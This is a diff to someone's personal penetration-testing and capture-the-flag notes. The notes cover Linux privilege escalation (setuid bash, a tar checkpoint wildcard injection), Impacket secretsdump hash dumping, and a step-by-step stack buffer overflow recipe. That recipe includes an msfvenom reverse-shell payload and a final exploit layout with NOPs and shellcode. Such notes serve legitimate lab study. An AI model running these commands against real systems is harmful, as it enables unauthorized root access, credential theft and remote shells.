@@ -3,6 +3,7 @@
 **Box Notes**
 1. Always check /etc/sudoers.d
 2. Always check /etc/crontab
+but dont trust /etc/crontab >:(
 3. Always check version, kernel release, and stuff
 ```
 cat /etc/*release
@@ -21,7 +22,7 @@ We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.
 
 9. IF there's motd.d executed once connected, always check the permission of the /etc/motd.d see if u can write on it
 
-10. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
+10. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod u+s /bin/bash` as root, bash -p
 11. linpeas linenum pspy name ur shits
 12. Always check `cat ~/.*history | less` or just `history`
 13. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
@@ -63,7 +64,7 @@ We can exploit that function to execute all the script in the directory (in this
 echo "chmod +s /bin/bash" > exploit.sh
 2. touch /home/user/--checkpoint=1
 3. touch /home/user/--checkpoint-action=exec=sh\ exploit.sh
-4. The touch and checkpoint command will make the tar command to execute the exploit.sh which allow us to escalate our privilage
+4. The touch and checkpoint command will make the tar command to execute the exploit.sh which allow us to escalate our privillege
 
 
 **Impacket**
@@ -77,6 +78,8 @@ Example:
 `python3 ~/scripts/impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL`
 `~/scripts/impacket/examples/secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>`
 and many more.. go research on it.
+
+[] >>> means optional command
 
 
 **PATH Privesc**
@@ -114,19 +117,43 @@ cat >>> can
 
 
 **Bufferoverflow**
+
+## Peda https://myexperiments.io/exploit-basic-buffer-overflow.html
+1. i func
+find the function address we want to jump to
+2. gdb [binary]
+3. pattern create [value]
+4. run '[the pattern]'
+see the EIP value
+5. pattern offset [EIP value]
+we got the exact overflow value
+6. python -c "print 'A' * [exact_value] + '[target address]'"
+target address usually little endian
+ex: 0x80484c6 >>>> \xc6\x84\x04\x08
+
+## Using msf-pattern and BOP usual case
 1. Predict the size
 2. msf-pattern_create.rb -l [the size] >>> we got the address
-3. msf-pattern_offset.rb -l [the size] -q [the EIP address]
-4. Generate shellcode
+3. msf-pattern_offset.rb -l [the size] -q [the EIP value] >>> we got the exact overflow value
+4. Find badchars (missing hex from the badchars list) >>> payload + badchars
+5. Find unprotected module, use `!mona modules` or smth
+6. Find jmp pointer (ESP) on unprotected module, use `!mona find -s "\xff\xe4" -m [unprotected dll or exe]`
+7. Got the ESP address, change it to little endian format
+ex: 0x080414C3 >>> \xC3\x14\x04\x08
+8. Overwrite the EIP with the little endian ESP address
+9. Generate shellcode with the badchars >>> overwrite with shellcode to gain remote access
 Example:
 msfvenom -p windows/shell_reverse_tcp LHOST=[yourip] LPORT=[yourport] EXITFUNC=thread -f c -a x86 -b "\x00"
 
 encode it with shikata_ga_nai if u want
 -f >>> the output file language
 -a >>> the architecture
--b >>> bad char
+-b >>> bad chars
 
-5. Got the shellcode, dont forget to put NOP'S '\x90'
+10. Dont forget to add NOPS (\x90) on final payload ('\x90' * 32 or more or less).
+11. Final payload formation: [Payload] + [ESP] + [NOPS] + [SHELLCODE]
+Example:
+`payload = b"A"*146 + b"\xC3\x14\x04\x08" + b"\x90" * 20 + shellcode`
 
 
 **Fix your terminal**
@@ -201,6 +228,7 @@ Charset (-f)
 2. diff -y [file1] [file2] >> compare file side by side
 3. binary mode FTP is better
 4. watch -n 0 [stuff you want to watch]
+ex = watch -n 0 ls -la /bin/bash
 5. when we have admin in windows, and meterpreter shell, try
 	`run post/windows/manage/enable_rdp `
 	and conenct rdp. Fun commands
